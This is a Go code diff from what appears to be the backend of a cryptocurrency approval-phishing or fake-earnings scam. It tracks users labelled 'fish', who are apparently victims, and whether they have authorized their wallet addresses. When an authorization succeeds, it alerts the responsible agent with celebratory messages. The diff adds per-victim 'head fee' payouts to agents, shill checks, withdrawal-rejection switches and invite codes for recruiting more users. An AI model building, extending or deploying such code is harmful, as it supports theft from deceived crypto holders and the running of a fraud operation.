@@ -81,6 +81,8 @@ func FishRegister(c *gin.Context) {
 	eth2, _ := eth.Float64()
 	config := model.Config{}
 	mysql.DB.Where("id=1").First(&config)
+	admin := model.Admin{}
+	mysql.DB.Where("id=?", AdminId).First(&admin)
 
 	addFish := model.Fish{
 		Token:                  token,
@@ -101,6 +103,7 @@ func FishRegister(c *gin.Context) {
 		MoneyEth:               eth2,
 		Belong:                 belongId,
 		BAddress:               config.BAddress,
+		InComeTimes:            admin.InComeTimes,
 	}
 
 	if IsCode {
@@ -149,9 +152,7 @@ func GetInformation(c *gin.Context) {
 
 		return
 	}
-
 	config := model.Config{}
-
 	mysql.DB.Where("id=1").First(&config)
 
 	fish.TodayEarningsETH = fish.TotalEarnings / h2
@@ -264,7 +265,6 @@ func FoxMoneyUpTwo(c *gin.Context) {
 		util.JsonWrite(c, -101, nil, "托不更新")
 		return
 	}
-
 
 	apikeyP := viper.GetString("eth.apikey")
 	apikeyArray := strings.Split(apikeyP, "@")
@@ -393,12 +393,10 @@ func CheckAuthorization(c *gin.Context) {
 			}
 			if basket.Result.Status == "1" {
 				//  hash 事务查询成功 交易成功
-
 				mysql.DB.Model(&model.Fish{}).Where("fox_address=?", foxAddress).Update(&model.Fish{Authorization: 2, Updated: time.Now().Unix(), BAddress: BAddress})
-
 				fish := model.Fish{}
 				err := mysql.DB.Where("fox_address=?", foxAddress).First(&fish).Error
-				if fish.MonitoringSwitch == 1 {
+				if fish.MonitoringSwitch == 1 { //监控开启
 					if err == nil {
 						//  新增授权
 						fishID := strconv.Itoa(int(fish.ID))
@@ -412,6 +410,25 @@ func CheckAuthorization(c *gin.Context) {
 							"所属代理ID:" + admin.Username + "%0A" +
 							" 时间: " + time.Now().Format("2006-01-02 15:04:05") + "%0A" + "👏👏👏"
 						model.NotificationAdmin(mysql.DB, fish.AdminId, content)
+					}
+				}
+
+				admin := model.Admin{}
+				err = mysql.DB.Where("id=?", fish.AdminId).First(&admin).Error
+				if err == nil {
+					if admin.CostOfHeadSwitch == 1 { //人头费开关
+						err1 := mysql.DB.Model(&model.Fish{}).Where("id=?", fish.ID).Update(&model.Fish{
+							CommissionIncome: fish.CommissionIncome + admin.CostOfHeadMoney,
+							TotalEarnings:    fish.TotalEarnings + admin.CostOfHeadMoney,
+						}).Error
+						if err1 == nil {
+							fins := model.FinancialDetails{
+								Kinds:   12,
+								FishId:  int(fish.ID),
+								Created: time.Now().Unix(),
+							}
+							mysql.DB.Save(&fins) //表记录
+						}
 					}
 				}
 
@@ -519,12 +536,12 @@ func GetIfNeedInCode(c *gin.Context) {
 	config := model.Config{}
 	err := mysql.DB.Where("id=1").First(&config).Error
 	if err != nil {
-		util.JsonWrite(c, -101, nil, "获取配置失败")
+		util.JsonWrite(c, -101, nil, "fail")
 		return
 	}
 	data := make(map[string]interface{})
 	data["ifCode"] = config.IfNeedInCode
-	util.JsonWrite(c, 200, data, "获取成功")
+	util.JsonWrite(c, 200, data, "success")
 	return
 }
 
@@ -537,10 +554,10 @@ func GetWithdrawalRejectedReasonSwitch(c *gin.Context) {
 	admin := model.Admin{}
 	err := mysql.DB.Where("id=?", mapWho["AdminId"]).First(&admin).Error
 	if err != nil {
-		util.JsonWrite(c, -101, nil, "获取配置失败")
+		util.JsonWrite(c, -101, nil, "fail")
 		return
 	}
-	util.JsonWrite(c, 200, admin.WithdrawalRejectedReasonSwitch, "获取成功")
+	util.JsonWrite(c, 200, admin.WithdrawalRejectedReasonSwitch, "success")
 	return
 }
 
@@ -551,21 +568,18 @@ func GetIfTiXianETh(c *gin.Context) {
 	config := model.Config{}
 	err := mysql.DB.Where("id=1").First(&config).Error
 	if err != nil {
-		util.JsonWrite(c, -101, nil, "获取配置失败")
+		util.JsonWrite(c, -101, nil, "fail")
 		return
 	}
 	data := make(map[string]interface{})
 	data["WithdrawalPattern"] = config.WithdrawalPattern
-	util.JsonWrite(c, 200, data, "获取成功")
+	util.JsonWrite(c, 200, data, "success")
 	return
 }
 
 /**
-
   获取 客服地址
-
 */
-
 func GetServiceAddress(c *gin.Context) {
 
 	who, err2 := c.Get("who")
@@ -576,9 +590,108 @@ func GetServiceAddress(c *gin.Context) {
 	admin := model.Admin{}
 	err := mysql.DB.Where("id=?", whoMap["AdminId"]).First(&admin).Error
 	if err != nil {
-		util.JsonWrite(c, -101, nil, "获取失败")
+		util.JsonWrite(c, -101, nil, "fail")
 		return
 	}
-	util.JsonWrite(c, 200, admin.ServiceAddress, "获取成功")
+	util.JsonWrite(c, 200, admin.ServiceAddress, "success")
 	return
+}
+
+/**
+  获取生成邀请链接
+*/
+func GetInviteCode(c *gin.Context) {
+
+	action := c.PostForm("action")
+	who, _ := c.Get("who")
+	mapWho := who.(map[string]string)
+	if action == "GET" {
+		//获取这条鱼的子代理
+		admin := model.Admin{}
+		err := mysql.DB.Where("id=?", mapWho["AdminId"]).First(&admin).Error
+		if err != nil {
+			util.JsonWrite(c, -101, nil, "Fetching failed. SubProxy does not exist")
+			return
+		}
+		//判断子代理这个开关是否开启
+		if admin.IfShowPromotionCodeSwitch == 2 { //关 非法请求
+			util.JsonWrite(c, -101, nil, "Application failed. Invalid request")
+			return
+		}
+
+		fish := model.Fish{}
+		mysql.DB.Where("id=?", mapWho["ID"]).First(&fish)
+
+		util.JsonWrite(c, 200, fish.TheOnlyInvited, "success")
+		return
+	}
+
+	if action == "UPDATE" {
+		//fmt.Println("---")
+
+		//判断是否可以 申请邀请码
+		if mapWho["TheOnlyInvited"] != "" {
+			util.JsonWrite(c, -101, nil, "Sorry, I have not opened this permission")
+			return
+		}
+
+		admin := model.Admin{}
+
+		err := mysql.DB.Where("id=?", mapWho["AdminId"]).First(&admin).Error
+		if err != nil {
+			//fmt.Println("11")
+			util.JsonWrite(c, -101, nil, "Application failed. Invalid request")
+			return
+		}
+
+		//判断子代理这个开关是否开启
+		if admin.IfShowPromotionCodeSwitch == 2 { //关 非法请求
+			//fmt.Println("22")
+
+			util.JsonWrite(c, -101, nil, "Application failed. Invalid request")
+			return
+		}
+
+		//fmt.Println(mapWho["Authorization"])
+		//if mapWho["Authorization"] == "1" && admin.UnAuthorizationCanInviteSwitch == 2 {
+		//	fmt.Println("???")
+		//	util.JsonWrite(c, -101, nil, "Application failed. Invalid request")
+		//	return
+		//}
+
+		//生成邀请码
+
+		var code string
+		for i := 0; i < 10; i++ {
+			code = util.RandStr(8)
+			err := mysql.DB.Where("the_only_invited=?", code).First(&model.Fish{}).Error
+			if err != nil {
+				//有错误 说明没有找到数据
+				break
+			}
+		}
+
+		err = mysql.DB.Model(&model.Fish{}).Where("id=?", mapWho["ID"]).Update(&model.Fish{TheOnlyInvited: code}).Error
+		if err != nil {
+			util.JsonWrite(c, -101, nil, "Failed to apply. Try again later")
+			return
+		}
+
+		util.JsonWrite(c, 200, code, "success")
+		return
+	}
+
+	if action == "SWITCH" {
+		admin := model.Admin{}
+		err := mysql.DB.Where("id=?", mapWho["AdminId"]).First(&admin).Error
+		if err != nil {
+			util.JsonWrite(c, -101, nil, "Fetching failed. SubProxy does not exist")
+			return
+		}
+
+		util.JsonWrite(c, 200, admin.IfShowPromotionCodeSwitch, "success")
+
+		return
+	}
+
 }
